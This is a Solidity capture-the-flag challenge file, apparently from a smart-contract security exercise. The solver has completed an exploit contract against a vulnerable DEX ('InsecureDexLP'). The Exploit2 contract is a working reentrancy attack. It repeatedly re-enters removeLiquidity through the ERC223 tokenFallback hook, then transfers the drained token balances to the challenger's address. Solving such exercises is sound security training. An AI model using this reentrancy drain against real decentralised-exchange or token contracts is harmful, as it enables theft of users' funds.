// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.14;

/*
 * Complete the contract below so that you can solve the challenge!
 * Note that you can (and may!) also modify the `deployExploits.js` file
 * and add the necessary calls to your exploit contract within the
 * `resolution.js` file.
 *
 * For this challenge, we already completed a tiny part of the
 * exploit contract for you! :)
 * 
 * Also, if you need to declare additional contracts as helpers,
 * feel free to do so!
 */

/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                           DEPENDENCIES                          //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

/*
 * To solve certain challenges, you will need some interfaces.
 * We kindly provide them below :)
 */

 interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface InsecureDexLP {
    function addLiquidity(uint256 amount0, uint256 amount1) external;
    function balanceOf(address user) external view returns(uint256);
    function removeLiquidity(
        uint256 amount
    ) external returns(uint amount0, uint amount1);
    function swap(
        address tokenFrom,
        address tokenTo,
        uint256 amountIn
    ) external returns(uint256 amountOut);
    function token0() external returns(IERC20);
    function token1() external returns(IERC20);
}


/*///////////////////////////////////////////////////////////////////
//                                                                 //
//                        EXPLOIT CONTRACTS                        //
//                                                                 //
///////////////////////////////////////////////////////////////////*/

contract Exploit2 {
    /*
     * HINT:
     * You will most likely use these things here ;)
     */
    IERC20 public token0_s; // this is insecureumToken
    IERC20 public token1_s; // this is simpleERC223Token
    InsecureDexLP public dex_s;
    uint256 amount_s;
    uint8 round_s = 10;
    bool exploitEnabled_s;
    address challenger_s;

    // Complete this contract!
    constructor(IERC20 t0, IERC20 t1, InsecureDexLP d) {
        token0_s = t0;
        token1_s = t1;
        dex_s = d;

        token0_s.approve(address(dex_s), 10 * 10 ** 18);
        token1_s.approve(address(dex_s), 10 * 10 ** 18);
    }

    function run(uint256 amount, address challenger) external {
        amount_s = amount;
        challenger_s = challenger;
        exploitEnabled_s = true;
        round_s = 0;
        dex_s.addLiquidity(amount_s, amount_s);
        dex_s.removeLiquidity(amount_s);
    }

    function tokenFallback(address, uint256, bytes memory) public returns (bool success, bytes memory result) {
        if (exploitEnabled_s && round_s < 9) {
            round_s++; // add to the writeup that I was getting an error and it was because I forgot to increment before calling
            dex_s.removeLiquidity(amount_s);
            
        } else if (exploitEnabled_s && round_s == 9) {
            token0_s.transfer(challenger_s, token0_s.balanceOf(address(this)));
            token1_s.transfer(challenger_s, token1_s.balanceOf(address(this)));
            exploitEnabled_s = false;
        }

        success = true;
        result = "";
    }
}